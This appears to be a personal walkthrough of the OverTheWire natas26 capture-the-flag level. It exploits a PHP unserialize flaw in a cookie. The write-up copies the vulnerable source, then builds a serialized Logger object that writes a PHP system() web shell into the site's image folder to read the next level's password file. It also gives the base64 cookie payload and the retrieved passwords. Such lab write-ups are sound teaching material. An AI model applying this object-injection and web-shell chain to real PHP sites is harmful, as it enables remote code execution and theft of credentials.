@@ -1,0 +1,254 @@
+PASSWORD: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
+
+Draw a line:
+X1 Y1 X2 Y2
+
+*ENTER NUMBERS TO DRAW A FEW LINES*
+
+*CTRL+SHIFT+I*
+*TOGGLE STORAGE*
+*TOGGLE COOKIES*
+*COPY DRAWING COOKIE*
+
+YTozOntpOjA7YTo0OntzOjI6IngxIjtzOjM6IjEwMCI7czoyOiJ5MSI7czozOiIyMDAiO3M6MjoieDIiO3M6MzoiMTAwIjtzOjI6InkyIjtzOjM6IjIwMCI7fWk6MTthOjQ6e3M6MjoieDEiO3M6MToiMCI7czoyOiJ5MSI7czozOiI0MDAiO3M6MjoieDIiO3M6MToiMCI7czoyOiJ5MiI7czozOiI2MDAiO31pOjI7YTo0OntzOjI6IngxIjtzOjE6IjAiO3M6MjoieTEiO3M6MToiMCI7czoyOiJ4MiI7czozOiIxMDAiO3M6MjoieTIiO3M6MzoiMTAwIjt9fQ%3D%3D
+
+*BURP SUITE*
+*TOGGLE DECODER*
+*DECODE AS URL*
+YTozOntpOjA7YTo0OntzOjI6IngxIjtzOjM6IjEwMCI7czoyOiJ5MSI7czozOiIyMDAiO3M6MjoieDIiO3M6MzoiMTAwIjtzOjI6InkyIjtzOjM6IjIwMCI7fWk6MTthOjQ6e3M6MjoieDEiO3M6MToiMCI7czoyOiJ5MSI7czozOiI0MDAiO3M6MjoieDIiO3M6MToiMCI7czoyOiJ5MiI7czozOiI2MDAiO31pOjI7YTo0OntzOjI6IngxIjtzOjE6IjAiO3M6MjoieTEiO3M6MToiMCI7czoyOiJ4MiI7czozOiIxMDAiO3M6MjoieTIiO3M6MzoiMTAwIjt9fQ==
+*DECODE AS BASE64*
+a:3:{i:0;a:4:{s:2:"x1";s:3:"100";s:2:"y1";s:3:"200";s:2:"x2";s:3:"100";s:2:"y2";s:3:"200";}i:1;a:4:{s:2:"x1";s:1:"0";s:2:"y1";s:3:"400";s:2:"x2";s:1:"0";s:2:"y2";s:3:"600";}i:2;a:4:{s:2:"x1";s:1:"0";s:2:"y1";s:1:"0";s:2:"x2";s:3:"100";s:2:"y2";s:3:"100";}}
+
+*REVERSE THE ENCODE*
+*EDIT THE BASE64 DECODE*
+a:1:{i:0;a:4:{s:2:"x1";s:3:"100";s:2:"y1";s:3:"200";s:2:"x2";s:3:"100";s:2:"y2";s:3:"200";}}
+*ENCODE TO BASE64
+YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjM6IjEwMCI7czoyOiJ5MSI7czozOiIyMDAiO3M6MjoieDIiO3M6MzoiMTAwIjtzOjI6InkyIjtzOjM6IjIwMCI7fX0=
+*ENCODE TO URL
+YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjM6IjEwMCI7czoyOiJ5MSI7czozOiIyMDAiO3M6MjoieDIiO3M6MzoiMTAwIjtzOjI6InkyIjtzOjM6IjIwMCI7fX0%3D
+
+*COPY NEW COOKIE
+
+*WEB BROWSER*
+*REPLACE DRAWING COOKIE WITH NEW COOKIE*
+*DELETE PARAMETER AND REFRESH URL: (http://natas26.natas.labs.overthewire.org/)
+DRAWING HAS WENT FROM MULTIPLE LINES TO ONE LINE - THE COOKIE IS BEING DESERIALIZED ON THE SERVER-SIDE
+
+*VIEW SOURCECODE*
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas26", "pass": "<censored>" };</script></head>
+<body>
+<?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+
+    class Logger{  <---------CLASS = OBJECT
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->initMsg);
+            fclose($fd);
+        }
+
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }
+
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }
+    }
+
+    function showImage($filename){
+        if(file_exists($filename))
+            echo "<img src=\"$filename\">";
+    }
+
+    function drawImage($filename){
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);
+        imagedestroy($img);
+    }
+
+    function drawFromUserdata($img){
+        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET["x1"], $_GET["y1"],
+                            $_GET["x2"], $_GET["y2"], $color);
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists("x1", $object) &&
+                        array_key_exists("y1", $object) &&
+                        array_key_exists("x2", $object) &&
+                        array_key_exists("y2", $object)){
+
+                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                        imageline($img,$object["x1"],$object["y1"],
+                                $object["x2"] ,$object["y2"] ,$color);
+
+                    }
+        }
+    }
+
+    function storeData(){
+        $new_object=array();
+
+        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+            $new_object["x1"]=$_GET["x1"];
+            $new_object["y1"]=$_GET["y1"];
+            $new_object["x2"]=$_GET["x2"];
+            $new_object["y2"]=$_GET["y2"];
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));  <----------DRAWING COOKINE IS UNSERIALIZED = VULNABILITY
+        }
+        else{
+            // create new array
+            $drawing=array();
+        }
+
+        $drawing[]=$new_object;
+        setcookie("drawing",base64_encode(serialize($drawing)));
+    }
+?>
+
+<h1>natas26</h1>
+<div id="content">
+
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form>
+
+<?php
+    session_start();
+
+    if (array_key_exists("drawing", $_COOKIE) ||
+        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
+        $imgfile="img/natas26_" . session_id() .".png";  <----------EXSISTING DIRECTORY
+        drawImage($imgfile);
+        showImage($imgfile);
+        storeData();
+    }
+
+?>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+*COPY OBJECT TO CREATE PHP CODE*
+<?PHP
+
+class Logger{
+        private $logFile;
+        private $initMsg;  <--------REMOVE
+        private $exitMsg;
+
+        function __construct($file){  <----------REMOVE $FILE = ()
+            // initialise variables
+            $this->initMsg="#--session started--#\n";  <----------REMOVE
+            $this->exitMsg="#--session end--#\n";  <----------ADD PHP NATAS CODE
+            $this->logFile = "/tmp/natas26_" . $file . ".log";  <----------USE AN EXISITING DIRECTORY
+	}  <----------END FUNCTION
+}  <----------END CLASS
+
+$seize = new Logger();  <----------CREATE NEW VARIABLE
+
+echo serialize($seize);
+
+
+*EXECUTE*
+<?PHP
+
+class Logger{
+        private $logFile;
+        private $exitMsg;
+
+        function __construct(){
+            // initialise variables
+            $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27');?>";
+            $this->logFile = "img/ra6narok.php";
+        }  
+}
+
+$seize = new Logger();
+
+echo serialize($seize);
+
+*CREATED AN OBJECT WITH TWO OBJECTS - LOGFILE AND EXIT MESSAGE*
+O:6:"Logger":2:{s:15:" Logger logFile";s:16:"img/ra6narok.php";s:15:" Logger exitMsg";s:49:"<?php system('cat /etc/natas_webpass/natas27');?>";}
+
+*BASE64 ENCODE*
+<?php
+
+class Logger{
+        private $logFile;
+        private $exitMsg;
+
+        function __construct(){
+            // initialise variables
+            $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27');?>";
+            $this->logFile = "img/ra6narok.php";
+		}
+}
+
+$seize = new Logger();
+
+echo base64_encode(serialize($seize));
+
+Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nL3JhNm5hcm9rLnBocCI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQ5OiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOz8+Ijt9  <-----------NEW DRAWING COOKIE
+
+*WEB BROWSER*
+URL: http://natas26.natas.labs.overthewire.org/
+*CTRL+SHIFT+I*
+*PASTE NEW DRAWING COOKIE*
+*REFRESH URL
+
+URL: http://natas26.natas.labs.overthewire.org/
+ Draw a line:
+X1 Y1 X2 Y2
+
+Fatal error: Uncaught Error: Cannot use object of type Logger as array in /var/www/natas/natas26/index.php:105 Stack trace: #0 /var/www/natas/natas26/index.php(131): storeData() #1 {main} thrown in /var/www/natas/natas26/index.php on line 105
+
+*COPY NEW DIRECTORY FILE /img/ra6narok.php AND ADD IT TO URL*
+URL: http://natas26.natas.labs.overthewire.org/img/ra6narok.php
+u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne
